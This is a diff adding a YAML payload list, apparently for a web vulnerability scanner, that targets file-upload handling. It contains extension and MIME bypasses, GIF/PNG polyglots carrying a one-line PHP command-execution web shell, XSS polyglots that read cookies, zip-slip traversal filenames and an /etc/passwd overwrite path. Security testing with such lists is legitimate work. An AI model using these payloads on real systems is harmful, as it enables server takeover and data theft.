@@ -1,0 +1,183 @@
+defaults:
+  vuln_type: file_upload
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # Extension bypass — double extensions
+  # ============================================================
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.php.jpg"
+    notes: "Double extension — Apache may process as PHP if AddHandler is misconfigured."
+    tags: [extension, double, php, apache]
+
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.php%00.jpg"
+    notes: "Null byte extension bypass — truncates filename at %00 in legacy systems."
+    tags: [extension, null_byte, php]
+
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.pHp"
+    notes: "Case-variant extension — bypasses case-sensitive extension blocklists."
+    tags: [extension, case, php]
+
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.php5"
+    notes: "Alternative PHP extension — php5, php7, phtml, pht are often executable."
+    tags: [extension, alt, php5]
+
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.phtml"
+    notes: "PHTML extension — another PHP-executable extension."
+    tags: [extension, alt, phtml]
+
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.aspx.jpg"
+    notes: "Double extension for IIS/ASP.NET context."
+    tags: [extension, double, aspx, iis]
+
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.jsp.png"
+    notes: "Double extension for Java/Tomcat context."
+    tags: [extension, double, jsp, tomcat]
+
+  # ============================================================
+  # MIME type bypass
+  # ============================================================
+  - technique: mime_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "Content-Type: image/jpeg"
+    notes: "Upload PHP/executable file with image/jpeg Content-Type. Tests if server validates MIME only."
+    tags: [mime, image, bypass]
+
+  - technique: mime_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "Content-Type: image/png"
+    notes: "Upload executable with image/png Content-Type."
+    tags: [mime, png, bypass]
+
+  - technique: mime_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "Content-Type: application/octet-stream"
+    notes: "Upload with generic octet-stream MIME — may bypass type-specific filters."
+    tags: [mime, octet_stream, bypass]
+
+  # ============================================================
+  # Content type mismatch (magic bytes)
+  # ============================================================
+  - technique: content_type_mismatch
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "GIF89a;<?php system($_GET['c']); ?>"
+    notes: "GIF magic bytes prefix with PHP code. Passes magic byte validation but contains executable code."
+    tags: [magic_bytes, gif, php, polyglot]
+
+  - technique: content_type_mismatch
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "\\x89PNG\\r\\n\\x1a\\n<?php system($_GET['c']); ?>"
+    notes: "PNG magic bytes prefix with PHP payload."
+    tags: [magic_bytes, png, php, polyglot]
+
+  # ============================================================
+  # Polyglot files
+  # ============================================================
+  - technique: polyglot_file
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 4
+    payload: "%PDF-1.4\\n1 0 obj<</Pages 1 0 R>>endobj\\ntrailer<</Root 1 0 R>>\\n<script>alert(1)</script>"
+    notes: "PDF/HTML polyglot — valid PDF header but also valid HTML. May execute JS in browser context."
+    tags: [polyglot, pdf, html, xss]
+
+  - technique: polyglot_file
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 4
+    payload: "GIF89a=1;/*<svg/onload=alert(1)>*/=alert(document.cookie)//"
+    notes: "GIF/JS/SVG polyglot — valid as GIF, contains SVG XSS and JS alert."
+    tags: [polyglot, gif, svg, xss]
+
+  # ============================================================
+  # Zip path traversal (zip slip)
+  # ============================================================
+  - technique: zip_path_traversal
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 4
+    payload: "../../../tmp/evil.txt"
+    notes: "Zip entry with path traversal filename. When extracted without validation, writes outside target directory."
+    tags: [zip_slip, path_traversal, extraction]
+
+  - technique: zip_path_traversal
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 4
+    payload: "..\\..\\..\\tmp\\evil.txt"
+    notes: "Zip entry with Windows-style path traversal."
+    tags: [zip_slip, path_traversal, windows]
+
+  - technique: zip_path_traversal
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 4
+    payload: "....//....//....//tmp/evil.txt"
+    notes: "Zip entry with double-dot bypass — some normalizers only strip one level."
+    tags: [zip_slip, path_traversal, double_dot]
+
+  # ============================================================
+  # Filename injection
+  # ============================================================
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.php;.jpg"
+    notes: "Semicolon in filename — Tomcat/Jetty may treat content before ; as the real extension."
+    tags: [extension, semicolon, tomcat]
+
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../etc/passwd"
+    notes: "Path traversal in upload filename — may overwrite arbitrary files on server."
+    tags: [filename, path_traversal, overwrite]
+
+  - technique: extension_bypass
+    injection_surface: file_upload
+    evidence_type: status_diff
+    risk: 3
+    payload: "shell.svg"
+    notes: "SVG file upload — SVG files can contain JavaScript via onload handlers. May achieve stored XSS."
+    tags: [extension, svg, xss]
